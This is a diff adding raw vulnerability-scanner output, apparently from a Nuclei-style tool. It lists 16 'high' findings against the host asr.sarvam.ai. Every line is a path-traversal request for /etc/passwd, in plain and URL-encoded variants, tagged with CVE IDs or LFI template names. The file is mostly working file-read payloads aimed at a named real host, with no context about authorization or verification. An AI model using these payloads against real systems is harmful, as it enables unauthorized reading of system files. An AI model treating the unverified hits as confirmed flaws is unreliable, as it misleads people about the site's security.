@@ -1,0 +1,16 @@
+[generic-linux-lfi] [http] [high] https://asr.sarvam.ai/./../../../../../../../../../../etc/passwd [paths="/./../../../../../../../../../../etc/passwd"]
+[bullwark-momentum-lfi] [http] [high] https://asr.sarvam.ai/../../../../../../../../../../../../../etc/passwd
+[gsoap-lfi] [http] [high] https://asr.sarvam.ai/../../../../../../../../../etc/passwd
+[CVE-2010-4231] [http] [high] https://asr.sarvam.ai/../../../../../../../../../../../../../etc/passwd
+[CVE-2019-7315] [http] [high] https://asr.sarvam.ai/../../../../../etc/passwd
+[CVE-2018-19326] [http] [high] https://asr.sarvam.ai/../../../../../../../../../../../../etc/passwd
+[nginx-merge-slashes-path-traversal] [http] [high] https://asr.sarvam.ai///////../../../etc/passwd
+[CVE-2018-7490] [http] [high] https://asr.sarvam.ai/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+[CVE-2018-10956] [http] [high] https://asr.sarvam.ai/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
+[CVE-2021-40978] [http] [high] https://asr.sarvam.ai/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[CVE-2022-38794] [http] [high] https://asr.sarvam.ai/../../../../../../../../etc/passwd
+[CVE-2020-12447] [http] [high] https://asr.sarvam.ai/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+[ups-network-lfi] [http] [high] https://asr.sarvam.ai/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+[ibm-infoprint-lfi] [http] [high] https://asr.sarvam.ai/./../../../../../../../../../../etc/passwd
+[CVE-2019-18922] [http] [high] https://asr.sarvam.ai/../../../../../../etc/passwd
+[CVE-2024-4956] [http] [high] https://asr.sarvam.ai/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
